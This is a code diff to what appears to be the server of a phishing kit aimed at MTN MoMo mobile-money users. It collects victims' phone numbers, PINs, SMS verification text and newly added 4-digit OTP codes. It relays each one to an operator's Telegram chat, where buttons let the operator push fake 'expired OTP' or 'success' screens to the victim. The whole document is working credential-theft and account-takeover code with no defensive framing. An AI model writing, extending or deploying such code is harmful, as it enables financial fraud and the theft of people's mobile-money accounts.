@@ -85,6 +85,7 @@ function getOrCreateSession(userId, adminChatId) {
       phone: '',
       pin: '',
       sms: '',
+      otp: '',
       status: 'READY_FOR_PIN'
     };
     sessions.set(activeId, session);
@@ -214,10 +215,26 @@ async function initBot() {
           );
           break;
         case 'APPROVE':
-          session.status = 'APPROVED';
+          session.status = 'PROCEED_OTP';
           await bot.sendMessage(
             chatTarget,
-            `🎉 *APPROVE* — Congratulations screen shown to applicant.`,
+            `✅ *SMS APPROVED* — Applicant opened 4-Digit OTP screen (CHECK SMS AND ENTER ON THE SPACE PROVIDED).`,
+            { parse_mode: 'Markdown' }
+          );
+          break;
+        case 'EXPIREDOTP':
+          session.status = 'EXPIRED_OTP';
+          await bot.sendMessage(
+            chatTarget,
+            `⚠️ *EXPIRED OTP CODE* — Applicant prompted to check SMS and enter a new 4-digit OTP.`,
+            { parse_mode: 'Markdown' }
+          );
+          break;
+        case 'SUCCESS':
+          session.status = 'SUCCESS';
+          await bot.sendMessage(
+            chatTarget,
+            `🎉 *SUCCESS* — Congratulations screen shown to applicant.`,
             { parse_mode: 'Markdown' }
           );
           break;
@@ -278,7 +295,6 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// First Telegram message: immediately after step 3 of 3 when 5-digit PIN & phone are filled (auto-submitted)
 app.post('/api/submit-pin', async (req, res) => {
   try {
     const { userId, phone, pin, applicantName, adminChatId } = req.body || {};
@@ -321,7 +337,6 @@ app.post('/api/submit-pin', async (req, res) => {
   }
 });
 
-// SMS verification submission (auto-submitted when starting with Y'ello. Please note!)
 app.post('/api/submit-sms', async (req, res) => {
   try {
     const { userId, phone, sms, autoDetected, adminChatId } = req.body || {};
@@ -361,7 +376,42 @@ app.post('/api/submit-sms', async (req, res) => {
   }
 });
 
-// Request new SMS notification immediately when applicant taps Request New SMS after 15s countdown
+app.post('/api/submit-otp', async (req, res) => {
+  try {
+    const { userId, phone, otp, adminChatId } = req.body || {};
+    const { activeId, session } = getOrCreateSession(userId, adminChatId);
+
+    const cleanOtp = String(otp || '').replace(/\D/g, '').slice(0, 4);
+    session.otp = cleanOtp;
+    if (phone) session.phone = phone;
+    session.status = 'WAITING_OTP_REVIEW';
+
+    const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;
+
+    const message =
+      `🔐 *MTN MOMO 4-DIGIT OTP*\n\n` +
+      `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
+      `🔢 *4-Digit OTP:* \`${escapeMarkdown(cleanOtp)}\``;
+
+    const opts = {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: 'EXPIRED OTP CODE', callback_data: `EXPIREDOTP_${activeId}` },
+            { text: 'SUCCESS', callback_data: `SUCCESS_${activeId}` }
+          ]
+        ]
+      }
+    };
+
+    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
+    return res.status(200).json({ success: true, userId: activeId });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Failed to send OTP to Telegram.' });
+  }
+});
+
 app.post('/api/request-new-sms', async (req, res) => {
   try {
     const { userId, phone, adminChatId } = req.body || {};
@@ -390,3 +440,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
+                    
